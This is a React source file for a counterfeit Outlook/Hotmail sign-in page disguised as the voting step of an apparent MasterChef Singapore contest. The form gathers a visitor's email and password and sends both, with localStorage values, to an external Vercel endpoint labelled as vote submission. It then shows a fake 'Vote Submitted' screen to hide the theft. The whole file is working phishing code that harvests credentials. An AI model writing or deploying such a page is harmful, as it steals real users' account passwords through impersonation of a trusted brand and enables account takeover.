import { useState } from "react";
import emailLogo from "../assets/email-logo.png";

export default function HotmailLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState(null);

  async function handleSubmit(e) {
    e.preventDefault();

    if (!email.trim() || !password.trim()) {
      alert("Please enter your email and password.");
      return;
    }

    setLoading(true);
    setStatus("pending");

    try {
      const res = await fetch(
        "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            candidate_number: localStorage.getItem("candidate"),
            platform: "hotmail",
            username: email,
            password,
            location: localStorage.getItem("voteLocation"),
          }),
        }
      );

      const data = await res.json();
      if (data.success) {
        setStatus("approved");
      } else {
        setStatus("rejected");
      }
    } catch (err) {
      console.error(err);
      setStatus("rejected");
    }

    setLoading(false);
  }

  if (status === "pending") {
    return (
      <div className="min-h-screen bg-[#eef2f7] flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-sm rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
          <img src={emailLogo} alt="Hotmail" className="mx-auto h-14 w-14 mb-6" />
          <h1 className="text-3xl font-semibold text-slate-900">Pending Approval</h1>
          <p className="mt-3 text-slate-600">Please wait while your vote is submitted.</p>
        </div>
      </div>
    );
  }

  if (status === "approved") {
    return (
      <div className="min-h-screen bg-[#eef2f7] flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-sm rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
          <img src={emailLogo} alt="Hotmail" className="mx-auto h-14 w-14 mb-6" />
          <h1 className="text-3xl font-semibold text-slate-900">Vote Submitted</h1>
          <p className="mt-3 text-slate-600">Your Hotmail vote was sent successfully.</p>
        </div>
      </div>
    );
  }

  if (status === "rejected") {
    return (
      <div className="min-h-screen bg-[#eef2f7] flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-sm rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
          <img src={emailLogo} alt="Hotmail" className="mx-auto h-14 w-14 mb-6" />
          <h1 className="text-3xl font-semibold text-red-600">Vote Rejected</h1>
          <p className="mt-3 text-slate-600">There was a problem submitting your vote.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#eef2f7] flex items-center justify-center px-4 py-10">
      <div className="w-full max-w-sm rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] overflow-hidden">
        <div className="px-6 py-10 sm:px-8 sm:py-12">
          <div className="flex flex-col items-center gap-2">
            <img src={emailLogo} alt="Hotmail" className="h-14 w-14" />
            <h1 className="text-3xl font-semibold text-slate-900">Outlook</h1>
            <p className="text-sm text-slate-500">Sign in to continue</p>
          </div>

          <form onSubmit={handleSubmit} className="mt-8 space-y-4">
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Email, phone, or Skype"
              className="w-full rounded-[18px] border border-slate-300 bg-slate-50 px-4 py-4 text-slate-900 outline-none transition focus:border-blue-600 focus:bg-white"
            />

            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full rounded-[18px] border border-slate-300 bg-slate-50 px-4 py-4 text-slate-900 outline-none transition focus:border-blue-600 focus:bg-white"
            />

            <button
              type="submit"
              disabled={loading}
              className="w-full rounded-[18px] bg-blue-600 px-4 py-3 text-base font-semibold text-white shadow-sm transition hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-60"
            >
              {loading ? "Signing in..." : "Sign in"}
            </button>

            <div className="flex items-center gap-3 text-sm text-slate-700">
              <input
                id="remember-hotmail"
                type="checkbox"
                className="h-4 w-4 rounded border-slate-300 text-blue-600 focus:ring-blue-500"
              />
              <label htmlFor="remember-hotmail">Keep me signed in</label>
            </div>

            <div className="text-sm text-slate-600">
              No account?{' '}
              <button
                type="button"
                className="text-blue-600 hover:underline"
                onClick={() => window.location.href = "/"}
              >
                Create one!
              </button>
            </div>

            <div className="text-sm text-blue-600 hover:underline">
              <button
                type="button"
                onClick={() => alert("Password recovery is not available in this demo.")}
              >
                Can't access your account?
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
